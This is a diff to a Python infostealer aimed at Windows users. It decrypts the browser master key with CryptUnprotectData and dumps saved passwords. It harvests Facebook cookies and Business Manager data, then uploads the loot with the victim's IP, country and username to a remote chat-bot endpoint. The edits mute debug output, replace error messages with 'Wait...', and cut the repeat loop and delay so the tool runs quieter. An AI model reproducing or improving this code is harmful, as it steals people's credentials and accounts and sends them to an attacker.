@@ -46,7 +46,7 @@ class Facebook():
         }
         self.rq.headers.update(headers)
         self.rq.cookies.update(cookies)
-        print(self.rq.cookies.update(cookies))
+        #print(self.rq.cookies.update(cookies))
         self.uid = cookies.get('c_user', None)
 
     def parse_cookie(self, cookie):
@@ -83,7 +83,6 @@ class Facebook():
         items = data.json()["data"]
         with open((os.path.join(os.environ["TEMP"], name_f, "data.txt")), 'a',encoding='utf-8') as f:
             f.write("Tổng Số Bm: "+str(len(items))+"\n\n")
-        print("Tổng Số Bm: ",len(items))
 
 
 
@@ -133,7 +132,6 @@ class Facebook():
 
     def main(self):
         if self.token() is False:
-            print(self.token())
             return False
         else:
             return self.Gen_list_id() ,self.Get_info_Bm()
@@ -320,7 +318,7 @@ def encrypt(data_profile):
     master_key = master_key[5:]  
     master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
     master_key_str = str(master_key)
-    print(master_key_str)
+    #print(master_key_str)
 
     with open((os.path.join(data_profile, "master_key.txt")), 'a',encoding='utf-8') as f:
         f.write(master_key_str)   
@@ -340,7 +338,7 @@ def encrypt(data_profile):
             with open((os.path.join(data_profile, "pass.txt")), 'a',encoding='utf-8') as f:
                 f.write("URL: " + url + "\t\t" + username + "|" + decrypted_password + "\n" + "\n")      
     except :
-        print("sai me r ")
+        print("Wait... ")
     def decrypt_data(data, key):
         try:
             iv = data[3:15]
@@ -399,7 +397,7 @@ def encrypt(data_profile):
             f.write(result_string+"\n\n")
   
     except:
-        print("lai sai r ")
+        print("Wait... ")
 def delete_file(data_profile):
     try:
         encrypt(data_profile)
@@ -643,7 +641,7 @@ def main():
         requests.post(u1,data={'caption': "\n"+"country :  " + city + "-"+ten_country+"-"+country_code +"\n" +"id :  " + id() +"\n"+ windows_version +"\nip: "+ip +"\nUsername :"+hostname+"/"+usernamex+ "\n"+ number,'chat_id': id1},files={'document': f})
     
 
-for _ in range(3):
+for _ in range(1):
     
     main()
     if os.path.exists(r'C:\Users\Public\pub.bat'):
@@ -652,4 +650,3 @@ for _ in range(3):
         os.remove(r'C:\Users\Public\publicc.bat')
     if os.path.exists(r'C:\Users\Public\Document.zip'):
         os.remove(r'C:\Users\Public\Document.zip') 
-    time.sleep(300)
